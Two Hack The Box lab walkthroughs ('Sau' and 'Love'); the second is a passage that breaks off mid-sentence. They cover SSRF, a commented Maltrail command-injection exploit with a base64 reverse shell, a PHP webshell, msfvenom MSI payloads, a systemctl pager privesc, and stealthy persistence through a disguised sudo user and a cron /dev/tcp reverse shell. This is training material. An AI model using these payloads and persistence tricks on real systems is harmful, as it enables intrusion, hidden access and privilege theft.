        "content": "Sau Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Sau How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walkthroughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: Basic TCP Scan: nmap $box -oA TCPbasicScan kali in HTB/BlogEntriesMade/Sau/scans/nmap 🍣 main 1Gweb/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 17:04:11 zsh ❯ nmap $box -oA TCPbasicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-24 17:04 GMT Nmap scan report for 10.129.80.109 Host is up (0.044s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp filtered http 55555/tcp open unknown Initial thoughts: SSH, Web \u0026amp; a strange service on 55555 Comprehensive Scans: In depth scan TCP:\nsudo nmap -p- -sV -sC -O --disable-arp-ping $box -oA FullTCP ali in HTB/BlogEntriesMade/Sau/scans/nmap 🍣 main 1Gweb/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 17:05:49 zsh ✖ sudo nmap -p- -sV -sC -O --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-24 17:06 GMT Nmap scan report for 10.129.80.109 Host is up (0.038s latency). Not shown: 65531 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA) | 256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA) |_ 256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519) 80/tcp filtered http 8338/tcp filtered unknown 55555/tcp open unknown | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 400 Bad Request | Content-Type: text/plain; charset=utf-8 | X-Content-Type-Options: nosniff | Date: Tue, 24 Dec 2024 17:06:57 GMT | Content-Length: 75 | invalid basket name; the name does not match pattern: ^[wd-_\\.]{1,250}$ | GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 302 Found | Content-Type: text/html; charset=utf-8 | Location: /Web | Date: Tue, 24 Dec 2024 17:06:31 GMT | Content-Length: 27 | href=\u0026#34;/Web\u0026#34;\u0026gt;Found\u0026lt;/a\u0026gt;. | HTTPOptions: | HTTP/1.0 200 OK | Allow: GET, OPTIONS | Date: Tue, 24 Dec 2024 17:06:32 GMT |_ Content-Length: 0 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port55555-TCP:V=7.94SVN%I=7%D=12/24%Time=676AEA16%P=x86_64-pc-linux-gnu SF:%r(GetRequest,A2,\u0026#34;HTTP/1\\.0\\x20302\\x20Found\\r\\nContent-Type:\\x20text/ht SF:ml;\\x20charset=utf-8\\r\\nLocation:\\x20/Web\\r\\nDate:\\x20Tue,\\x2024\\x20Dec SF:\\x202024\\x2017:06:31\\x20GMT\\r\\nContent-Length:\\x2027\\r\\n\\r\\n\u0026lt;a\\x20href= SF:\\\u0026#34;/Web\\\u0026#34;\u0026gt;Found\u0026lt;/a\u0026gt;\\.\\n\\n\u0026#34;)%r(GenericLines,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x SF:20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnectio SF:n:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r(HTTPOptions,60,\u0026#34;HTTP/1\\.0\\ SF:x20200\\x20OK\\r\\nAllow:\\x20GET,\\x20OPTIONS\\r\\nDate:\\x20Tue,\\x2024\\x20Dec SF:\\x202024\\x2017:06:32\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n\u0026#34;)%r(RTSPReq SF:uest,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/pl SF:ain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Requ SF:est\u0026#34;)%r(Help,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x2 SF:0text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad SF:\\x20Request\u0026#34;)%r(SSLSessionReq,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\ SF:nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\ SF:r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r(TerminalServerCookie,67,\u0026#34;HTTP/1\\.1\\x20 SF:400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\ SF:r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r(TLSSessionReq, SF:67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\ SF:x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;) SF:%r(Kerberos,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20 SF:text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\ SF:x20Request\u0026#34;)%r(FourOhFourRequest,EA,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20Request SF:\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nX-Content-Type-Opt SF:ions:\\x20nosniff\\r\\nDate:\\x20Tue,\\x2024\\x20Dec\\x202024\\x2017:06:57\\x20G SF:MT\\r\\nContent-Length:\\x2075\\r\\n\\r\\ninvalid\\x20basket\\x20name;\\x20the\\x2 SF:0name\\x20does\\x20not\\x20match\\x20pattern:\\x20\\^\\[\\\\w\\\\d\\\\-_\\\\\\.\\]{1,250 SF:}\\$\\n\u0026#34;)%r(LPDString,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-T SF:ype:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400 SF:\\x20Bad\\x20Request\u0026#34;)%r(LDAPSearchReq,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Req SF:uest\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x2 SF:0close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;); Device type: general purpose Running: Linux 5.X OS CPE: cpe:/o:linux:linux_kernel:5.0 OS details: Linux 5.0 Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 114.86 seconds Findings: So it\u0026rsquo;s running Ubuntu, there is also a Webserver running 55555 SSH 22: Even though SSH is running it\u0026rsquo;s often not worth trying bruteforce due to how slow it is so I will come back to this later. Web 80: Web Enumeration via Burp Suite: When enumerating a Website, always use Burp Suite. This allows you to: Record all potential injection points. Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress. WhatWeb: Lets run \u0026ldquo;whatWeb\u0026rdquo; to see if I can glean some further information:\nwhatWeb http://$box | sed 's/, /\\n/g' +Note+: I use sed to put the output across multiple lines for a nicer output. It fails. It looks to me like this can\u0026rsquo;t be accessed yet. Service 55555: WhatWeb: Lets run \u0026ldquo;whatWeb\u0026rdquo; to see if I can glean some further information: whatWeb http://$box:55555 | sed 's/, /\\n/g' Manually Visiting the page: When visiting the page I can see it\u0026rsquo;s for a service called request-baskets.\nLooking at the repo for the project I can see its a \u0026ldquo;HTTP requests collector to test Webhooks, notifications, REST clients and more …\u0026rdquo; Creating a basket:\nI create a basket. I am issued with a token: When I open the basket I am treated to this page:\nClicking the clog in the top right it reveals I can forward our requests to a url of our choosing.\nI stand-up a python server:\npython -m http.server 9000 I put the URL into the box as Ill as /POC.\nI save \u0026ldquo;Apply\u0026rdquo; it. I make a request with the supplied url: http://10.129.80.109:55555/xk7ox7n I immediately get a hit on Webserver.\nDiscovering The Host Is Vulnerable To SSRF CVE-2023-27163: Lets see if I can access the service running on port 80 of the machine, that I could not access before.\nI change the forward url to http://127.0.0.1:80 I visit the page but nothing happens.\nI then enable the below options:\nWhen I go now I get the following page:\nlooking it appears to be a service called \u0026ldquo;MalTrail\u0026rdquo; and it\u0026rsquo;s version 0.53 2. Foothold: Getting A Reverse Shell Using CVE-2023-27163 Exploit: I find this exploit for the software MailTrail v 0.53 - https://github.com/spookier/Maltrail-v0.53-Exploit it takes advantage of this command injection RCE\nhttps://www.rapid7.com/db/modules/exploit/unix/http/maltrail_rce/ CVE-2023–27163. The username parameter is vulnerable to an injection attack. The POC exploit is below.\n+Note+: I have added comments to it to explain what is happening. import sys; # import system to take CLI args. import os; # import OS to directly interact wtih the operating system. import base64; # import base64 for encoding payload. # Declare Main Function/Logic def main(): # Declare variables listening_IP = None listening_PORT = None target_URL = None # Simple if statement that checks if all CLI args are provided, if not it errors our and prints a message. if len(sys.argv) != 4: print(\u0026#34;Error. Needs listening IP, PORT and target URL.\u0026#34;) return(-1) # Takes the CLI args from the user (appends \u0026#34;/login\u0026#34; to the target url) listening_IP = sys.argv[1] listening_PORT = sys.argv[2] target_URL = sys.argv[3] + \u0026#34;/login\u0026#34; # Prints a message stating that the exploit is running. print(\u0026#34;Running exploit on \u0026#34; + str(target_URL)) # Runs the curl_cmd function with the provided user variables. curl_cmd(listening_IP, listening_PORT, target_URL) # Define the curl_cmd function, which takes 3 arguments. The users IP, the PORT \u0026amp; the target_url. def curl_cmd(my_ip, my_port, target_url): # Define the payload. # This is a simple python reverse shell, which imports socket, os \u0026amp; pty. # It takes the user provided args listening_IP \u0026amp; listening_PORT and they are passed as my_ip, my_port as f-string args payload = f\u0026#39;python3 -c \\\u0026#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;{my_ip}\u0026#34;,{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\u0026#34;/bin/sh\u0026#34;)\\\u0026#39;\u0026#39; # It encodes the payload in base64 format. encoded_payload = base64.b64encode(payload.encode()).decode() # encode the payload in Base64 # It runs a curl command, and passes the data via the `username` parameter where it echoes out the payload, base64 decrypts it and then passes it for a subshell for execution. command = f\u0026#34;curl \u0026#39;{target_url}\u0026#39; --data \u0026#39;username=;`echo+\\\u0026#34;{encoded_payload}\\\u0026#34;+|+base64+-d+|+sh`\u0026#39;\u0026#34; os.system(command) if __name__ == \u0026#34;__main__\u0026#34;: main() I start my local listener.\nrlwrap -cAr nc -nvlp 4433 I run the exploit and get a shell.\nLets get the user flag:\nNow that I have a shell, I will upgrade it so I can have more functionality.\npython3 -c 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)' I check what commands I can run with sudo privileges and there is a service, trail.service I can run with sudo privileges.\n3. Privilege Escalation: Side-quest/rabbit hole: +Note+: This was a little side quest that I have left in for transparency.\nReading the service file I can see it runs the server.py file which is in the /opt/maltrail folder. Which means if I can edit this file or if I can change the file it executes.\nI tried a lot of ways to get vim working, however no matter how I upgraded my shell it would not work. Luckily I can use built in tools such as sed to replace content within the files.\n# Command: sed -i \u0026#39;s/[ReplaceThisContent]/[WithThisContent]/\u0026#39; [File] It\u0026rsquo;s as simple as that, it\u0026rsquo;s much like find and replace within vim. E.G. I can pass flags such as g to perform global replacements in the entire file. Let\u0026rsquo;s create a python reverse shell in our home dir.\necho \u0026#39;import os,pty,socket;s=socket.socket();s.connect((\u0026#34;10.10.14.18\u0026#34;,4242));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39; \u0026gt;\u0026gt; ~/shell.py I can now use sed to modify the trail.service to point at our new reverse shell.\nsed -i \u0026#34;s/ExecStart=\\/usr\\/bin\\/python3\\ server.py/ExecStart=\\/usr\\/bin\\/python3\\ \\/home\\/puma\\/shell.py/g\u0026#34; trail.service Ill that did not work as I cannot write to the file.\nDiscovering The Host Is Vulnerable To CVE-2023-26604: I put linpeas on the host but do not find anything of note.\nAs this is a box/ctf I can\u0026rsquo;t help but think that the service I can execute as root does have something to do with the privesc path.\nI check the version of systemctl running:\nsystemctl --version I can see it\u0026rsquo;s version: systemd 245 (245.4-4ubuntu3.22) I search for the phrase \u0026ldquo;systemd 245 (245.4-4ubuntu3.22) privesc\u0026rdquo; and find the following page: https://packetstorm.news/files/id/174130 .\nReading the article it appears that when I request the status of a service e.g:\nsudo systemctl status [service] It will open the output in a pager, which allows us to execute additional commands and as this is running in the context of the root user if I type !/bin/sh I can launch a root shell. +Note+: It is also possible to run other commands but for the purpose of this we want RCE in the context of the root user. Getting A Reverse Shell Using CVE-2023-26604: I view the output of the trail.service as I can run that in the context of root. sudo systemctl status trail.service With this open I can now run !/bin/sh to launch the root terminal. I get the root flag: 4. Persistence: Now that I have root access I would like to retain it so I will demonstrate two simple persistence techniques. Creating a high privileged \u0026ldquo;service\u0026rdquo; account for persistence: I create an account called \u0026ldquo;nginx\u0026rdquo; and give myself root privileges \u0026amp; access to the bash shell. I use this name as it\u0026rsquo;s one you could see on a machine and will raise less suspicion.\nsudo useradd -m -s /bin/bash nginx\nCreates a new user named nginx. -m: Creates a home directory for the user. -s /bin/bash: Sets the user\u0026rsquo;s default shell to /bin/bash. sudo usermod -aG sudo nginx\nAdds the nginx user to the sudo group. -a: Appends the user to the group (avoids overwriting existing groups). -G sudo: Specifies the sudo group. sudo passwd nginx\nSets or updates the password for the nginx user. Prompts us to add a new password and confirms it. I switch to the newly created user\nI check I have sudo privileges, as expected I do.\nI ensure I can actually read sudo level files by reading /etc/shadow\nCreating a cron job reverse shell: (crontab -l \u0026gt; .tab ; echo \u0026#34;* * * * * /bin/bash -c \u0026#39;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.18/443 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; \u0026gt;\u0026gt; .tab ; crontab .tab ; rm .tab) \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 Let\u0026rsquo;s verify it\u0026rsquo;s in the crontab by running crontab -l\nAs I can see it\u0026rsquo;s running. I start my listener and get a connection back after 1 minute.\n+Note+: This is great as a means to call back out to our attack machine, however an interval of every 1 minute is excessive, it would typically be better to set it at longer intervals to re-connect.\nLessons Learned: What did I learn? I actually learned about the systemctl CVE, I was not aware of that before. This box helped me cement more SSRF learning, I have been grinding some SSRF/Web boxes recently to get better at them. What silly mistakes did I make? Nothing of note this time, which is nice. Sign off: Remember, folks as always: with great poIr comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at bloodstiller dot com\n",

        "content": "Love Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Love How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: Basic TCP Scan: nmap $box -Pn -oA TCPbasicScan 🕙 06:05:33 zsh ❯ nmap $box -oA TCPbasicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-23 06:05 GMT Nmap scan report for 10.129.48.103 Host is up (0.043s latency). Not shown: 993 closed tcp ports (reset) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 443/tcp open https 445/tcp open microsoft-ds 3306/tcp open mysql 5000/tcp open upnp Nmap done: 1 IP address (1 host up) scanned in 2.09 seconds Initial thoughts: HTTP/HTTPs SMB MYSQL Interestingly a service on 5000 Comprehensive Scans: In depth scan TCP: sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP ali in HTB/BlogEntriesMade/Love/scans/nmap 🍣 main 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 06:05:37 zsh ❯ sudo nmap - mputer name: LOVE\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2024-12-22T23:32:20-08:00 |_clock-skew: mean: 3h21m34s, deviation: 4h00m02s, median: 1h21m33s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 252.50 seconds Findings: Looking at the certificate there is a DNS entry for staging.love.htb \u0026amp; the organization name ValentineCorp. | ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in I can see that the computer name is love | Computer name: Love Further services are running: HTTP: 5040 pando-pub 7680 RPC: 47001 49664 49665 49666 49667 49668 49669 49670 Updating ETC/HOSTS \u0026amp; Variables: Updated Domain \u0026amp; Machine Variables for Testing:\nNow that I have this information, I can update the domain and machine variables used in tests: update_var domain \u0026quot;love.htb\u0026quot; update_var machine \u0026quot;love\u0026quot; Updating /etc/hosts for DNS and LDAP Queries:\nI update my /etc/hosts file. echo \u0026quot;$box $domain staging.$domain\u0026quot; | sudo tee -a /etc/hosts SMB 445: Attempting to connect with NULL \u0026amp; Guest sessions: This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold: netexec smb $box -u 'guest' -p '' --shares netexec smb $box -u '' -p '' --shares Service 5000: I try and access the service on this port via telnet and the browser but it\u0026rsquo;s forbidden. telnet $box 5000 curl http://$box:5000 -v -L Forbidden. Service 7680: I get no response from this service via telnet or curl. telnet $box 7680 curl http://$box:7680 -v -L Web 80/443: Web Enumeration via Burp Suite: When enumerating a website, always use Burp Suite. This allows you to: Record all potential injection points. Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress. Whatweb: Lets run \u0026ldquo;whatweb\u0026rdquo; to see if I can glean some further information: whatweb $box | sed 's/, /\\n/g' kali in HTB/BlogEntriesMade/Love/scans/nmap 🍣 main 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 06:37:10 zsh ❯ whatweb $box | sed \u0026#39;s/, /\\n/g\u0026#39; http://10.129.48.103 [200 OK] Apache[2.4.46] Bootstrap Cookies[PHPSESSID] Country[RESERVED][ZZ] HTML5 HTTPServer[Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27] IP[10.129.48.103] JQuery OpenSSL[1.1.1j] PHP[7.3.27] PasswordField[password] Script Title[Voting System using PHP] X-Powered-By[PHP/7.3.27] X-UA-Compatible[IE=edge] +Note+: I use sed to put the output across multiple lines for easier reading. Dirbusting the webserver using ferox: I Perform some directory busting to see if there are any interesting directories: feroxbuster -u http://$domain/ --threads 20 --scan-limit 2 -q -r -o $domainFeroxScan.txt There are alot of hits as well as an admin panel. There are these files in ADMIN however they do not yield anything of note when I access them. love.htb: Visiting the web page: It\u0026rsquo;s always good to just manually click around and manually enumerate the pages available. I visit the web page http://love.htb/index.php and it\u0026rsquo;s a login page for a voting system. I try and login with test credentials and capture the post request. Bruteforcing Login with FFUF: Lets try some bruteforcing, for fun. I get the POST request from burp I modify it to the below so it\u0026rsquo;s compatible with ffuf. ffuf -w ~/Wordlists/rockyou.txt -u $\u0026#39;http://love.htb/login.php\u0026#39; -X POST -H $\u0026#39;Host: love.htb\u0026#39; -H $\u0026#39;Content-Length: 31\u0026#39; -H $\u0026#39;Cache-Control: max-age=0\u0026#39; -H $\u0026#39;Accept-Language: en-US,en;q=0.9\u0026#39; -H $\u0026#39;Origin: http://love.htb\u0026#39; -H $\u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; -H $\u0026#39;Upgrade-Insecure-Requests: 1\u0026#39; -H $\u0026#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#39; -H $\u0026#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#39; -H $\u0026#39;Referer: http://love.htb/\u0026#39; -H $\u0026#39;Accept-Encoding: gzip, deflate, br\u0026#39; -H $\u0026#39;Connection: keep-alive\u0026#39; -b $\u0026#39;PHPSESSID=au4g1f3co0aocdo2efhui2r734\u0026#39; -d $\u0026#39;voter=admin\u0026amp;password=FUZZ\u0026amp;login=\u0026#39; -ic -fw 1 -fs 341 I let it run but get no hits. Reading the source code: I check the source code of the page as sometimes I can find useful information such as dev comments etc.\nI can see that the service is using software called ADMINLTE\nAfter some quick searching I find there is a vuln for LFI however it does not appear to vulnerable.\nhttps://security.snyk.io/vuln/SNYK-JS-ADMINLTE-3314993 staging.love.htb: Visiting the web page: Looking at the page it\u0026rsquo;s a file scanner. There is a DEMO where I can enter URL to have it scan. Discovering the DEMO page is vulnerable to SSRF: I stand a python webserver and enter the information into the scanner on the site.\nI can see I get a valid connection. I enter local host address http://127.0.0.1:80 and it shows the login box for the service running on the root web address love.htb. This signifies a SSRF vulnerability\nRetrieving Clear Text Credentials from the service running on port 5000: As I now know there is an SSRF vulnerability. I access the services I know are running but cannot access 7680 \u0026amp; 5000 so far.\nService 7680:\nI get no hits. Service 5000:\nI get a hit \u0026amp; retrieve clear text creds from a password service that is only accessible via localhost. Creds: admin:@LoveIsInTheAir!!!! Conducting An Internal Port Scan VIA The SSRF Vulnerability: To ensure that I do not miss anything I also conduct an internal port scan for all ports in-case there is anything else running internally.\nI create a port list to use:\nseq 1 65535 \u0026gt; Ports.txt I copy the POST request from Burp. I modify the curl command so it can be used with ffuf: adding the wordlist -w specifying the url -u adding the injection point: http://127.0.0.1:FUZZ Removing the newlines and making 1 line Proxying all traffic via burp -x http://127.0.0.1:8080 Remove size of 61 -fs 61 This can only be done once I have the initial response so I can then filter for the standard response. ffuf -w ~/Wordlists/45.06-CustomWordlists/Ports.txt -u $\u0026#39;http://staging.love.htb/beta.php\u0026#39; -X $\u0026#39;POST\u0026#39; -H $\u0026#39;Host: staging.love.htb\u0026#39; -H $\u0026#39;Content-Length: 47\u0026#39; -H $\u0026#39;Cache-Control: max-age=0\u0026#39; -H $\u0026#39;Accept-Language: en-US,en;q=0.9\u0026#39; -H $\u0026#39;Origin: http://staging.love.htb\u0026#39; -H $\u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; -H $\u0026#39;Upgrade-Insecure-Requests: 1\u0026#39; -H $\u0026#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#39; -H $\u0026#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#39; -H $\u0026#39;Referer: http://staging.love.htb/beta.php\u0026#39; -H $\u0026#39;Accept-Encoding: gzip, deflate, br\u0026#39; -H $\u0026#39;Connection: keep-alive\u0026#39; -d $\u0026#39;file=http%3A%2F%2F127.0.0.1%3AFUZZ\u0026amp;read=Scan+file\u0026#39; -x http://127.0.0.1:8080 -fs 61 I have added the image of the command below as I know sometimes the formatting of my site can lead to the code boxes running off of the page. (will fix, soz bbz)\nFindings: I just get a list of all the ports I have already found and nothing additional of note.\nAccessing the admin panel: I use the creds on the admin panel to login\nLooking at the admin panel I can see it\u0026rsquo;s called \u0026ldquo;Voting System\u0026rdquo; I do some googling and find the source code here - https://code-projects.org/voting-system-in-php-with-source-code/ 2. Foothold: Getting RCE on the host \u0026amp; a reverse shell: I do some searching and find an SQL vulnerability that enables the ability to dump the voters database, however if I look at the voters panel on the admin portal there are no registered users. So we could dump it and get an empty db.\nLooking further I find this exploit enabling RCE via an authenticated file upload attack.\nhttps://www.exploit-db.com/exploits/49445 Looking at the exploit it\u0026rsquo;s apparent that this is just a PHP reverse shell being uploaded as a profile photo for a user. The script connects, creates a new user and uploads the photo as a reverse shell, it then requests the reverse shell \u0026amp; triggers it. To verify this works I create a simple php shell \u0026amp; save it as shell.php\n\u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt; I upload it.\nI open the image in a new tab.\nI enter a simple command and it executes proving it\u0026rsquo;s vulnerable and that I have RCE.\nhttp://love.htb/images/shell.php?cmd=dir Now I could get a reverse-shell but this a chance for me to play with tools I don\u0026rsquo;t really use often, so I am going to use the wwwolf-php-webshell . It\u0026rsquo;s an amazing interactive web-shell.\nI download the main webshell.php file and repeat the same process as before, uploading as a profile pic for a new user and then accessing that profile pic.\nWhen I view the image I have this nice interactive webshell\nLet\u0026rsquo;s grab our user flag:\nI upload nc64.exe.\nMy webshell fun was short-lived, I want to run tools easily on the host OS. I connect back to my attack machine \u0026amp; get a reverse shell.\nEnumerating the host as phoebe: I can see I am logged in as a user called phoebe I run the following command to enumerate information about her and other logged in users.\nwhoami /priv /groups; query user; net user Shows: User privs User Group membership Other logged in users All users on the machine: (done last as list may be extensive) Nothing of note here. I upload Winpeas and execute it.\nIt extracts phoebes NTLMv2 hash. I run it through hashcat against rock you but it won\u0026rsquo;t crack. +Note+: As this is an easier box, I am not making a custom wordlist with CeWL as I don\u0026rsquo;t see that being a viable option given the difficulty of the box. Always install elevated available: Which can be a viable privesc path.\nIt is possible to check this setting manually too by querying the registry directly\nEnumerate if the Key exists (\u0026amp; therefore policy enabled) using Powershell:\n#Query machine policy (system wide): reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated #Query user policy (is the key set for the user I are logged in with ) reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated As I can see it\u0026rsquo;s set globally as a machine policy, this is bad! As it means that any user can install anything with admin privileges. We can use this to elevate to System. Primer: Key Differences in reg queries: Registry Hive Scope:\nHKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated:\nRefers to HKEY_LOCAL_MACHINE (HKLM), which applies settings at the system-wide level. Changes here affect all users on the machine. HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated:\nRefers to HKEY_CURRENT_USER (HKCU), which applies settings at the user-specific level. Only affects the currently logged-in user. Purpose\nHKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer:\nspecifically queries the AlwaysInstallElevated value in the HKEY_LOCAL_MACHINE hive. Represents a system-wide policy that determines if MSI files can be installed with elevated privileges (Administrator rights). Enabled (1): Allows all users to install MSI files with elevated privileges. Disabled (0 or absent): Prevents this behavior globally. HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated:\nSpecifically queries the AlwaysInstallElevated value. Determines whether the user can install software with elevated privileges (Administrator rights). Enabled (1): Allows installing MSI files with elevated privileges. Disabled (0 or absent): Prevents this behavior. 3. Privilege Escalation: Privesc Method 1: Creating a malicious msi reverse shell with msfvenom: I use msfvenom to create a malicious evil.msi file that is a reverse shell\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.80 LPORT=8888 -a x64 --platform Windows -f msi -o evil.msi I standup my python webserver.\npython3 -m http.server 9000 Copy the malicious msi to the host:\nStandup my nc listener:\nrlwrap -cAr nc -nvlp 8888 Run the .msi file and catch my NT/Authority\\system shell.\nGet the root flag:\nPrivesc Method 2: Adding a new Admin User with msfvenom: +Note+: This method is a bit more long winded and uses the same exploitation method of \u0026ldquo;always install elevated\u0026rdquo; but is a different route.\nI use msfvenom to create our malicious msi to add a new user.\nmsfvenom -p windows/adduser USER=bloodstiller PASS=BL00dstiLL3r# --platform Windows -f msi -o addAdminUser.msi I standup my python webserver.\npython3 -m http.server 9000 Copy the malicious msi to the host:\nVerify there are only the legitimate users on the host:\nRun the malicious addAdminUser.msi:\nVerify the user has been added:\nNow I cannot to use /runas as the shell is limited so I cannot pass credentials directly. Instead to run commands as the new user I will need to use a PowerShell Credentialed Object.\nA PowerShell credential object is an instance of the System.Management.Automation.PSCredential class that securely stores a 